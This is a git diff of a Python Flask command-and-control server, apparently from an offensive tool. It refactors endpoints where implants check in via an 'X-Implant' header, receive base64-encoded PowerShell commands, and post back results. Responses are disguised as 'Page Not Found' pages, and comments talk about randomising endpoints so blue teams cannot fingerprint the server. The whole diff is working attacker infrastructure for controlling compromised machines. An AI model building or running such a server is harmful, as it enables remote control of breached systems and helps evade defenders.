@@ -14,18 +14,17 @@ app.config['SECRET_KEY'] = str(uuid4())
 # Adding the functions which manage encoding built in commands for transfer
 def craft_sound_file(path):
     print("Crafting audio file")
+    
     with open(path, 'rb') as file:
-        blah = "PS".encode()+base64.b64encode(file.read())
+        audio = "PS".encode()+base64.b64encode(file.read())
 
-        print(type(blah))
-    return blah
+        # print(type(audio))
+    return audio
 
 
 def craft_powershell_native_command(args):
-    print(args, args['args'].encode())
     a = base64.b64encode(args['args'].encode()).decode()
     b = args['type']+a
-    print(b)
     return b
 
 
@@ -80,49 +79,29 @@ def Stager():
         return "404", 404
 
 
-@app.route("/index", methods=['GET', 'POST'])
-def ImplantCheckIn():
-    #
-    if 'X-Implant' in request.headers:
-        # Debugging:
-        # print("Check in: {}".format( app.config['listener_type']))
-        cmd_to_execute = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
-        print(cmd_to_execute, type(cmd_to_execute))
-        response = make_response("Page Not Found.")
-        # if cmd_to_execute !="==":
-        #     print("ImplantCheckIn: ",cmd_to_execute)
-        response.headers["X-Command"] = cmd_to_execute
-    else:
-        response = make_response("Page Not Found")
-        response.headers["X-Command"] = "=="
-    return response
-
-
-@app.route("/index2", methods=["GET", "POST"])
+@app.route("/index", methods=["GET", "POST"])
 def implant_beacon_endpoint():
     if 'X-Implant' not in request.headers:
-       return "404"
-    print(request.data)
-    # This will be replaced by the check for a valid implant_id in production.
-    if request.headers['X-Implant'] == "870428":
+       return "=="
+    if request.method == "POST":
         next_cmd = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
-        print(preprocessing[next_cmd['type']])
-        processed_return_val = preprocessing[next_cmd['type']](next_cmd)
-        # We process the next_cmd dictionary to determine any unique pre-processing we must perform
-        print(len(processed_return_val))
-        return processed_return_val
-
-    return "0"
+        if next_cmd != "==":
+            processed_return_val = preprocessing[next_cmd['type']](next_cmd)
+            return processed_return_val
+    # Need to remove the use of == in beacons: this is too fingerprintable.
+    return "=="
 
 
 
 @app.route("/help", methods=['GET', 'POST'])
 def ImplantCommandResult():
     # -- X-Result is a placeholder header and should be changed to a more realistic value
+    response_stream_data = request.stream.read()
+    decoded_response_stream_data = response_stream_data.decode()
     if "X-Result" in request.headers:
-        decoded_response = base64.b64decode(request.headers["X-Result"]).decode('utf-16').split("::", 1)
-        Imp.CommandResponse(decoded_response[0], decoded_response[1], app.config['listener_type'])
-    return "Page Not Found"
+        decoded_response = base64.b64decode(decoded_response_stream_data+"==")
+        Imp.CommandResponse(request.headers['X-Result'], decoded_response, app.config['listener_type'])
+    return "=="
 
 
 # This should be randomised to avoid blueteams fingerprinting the server by querying this endpoint.
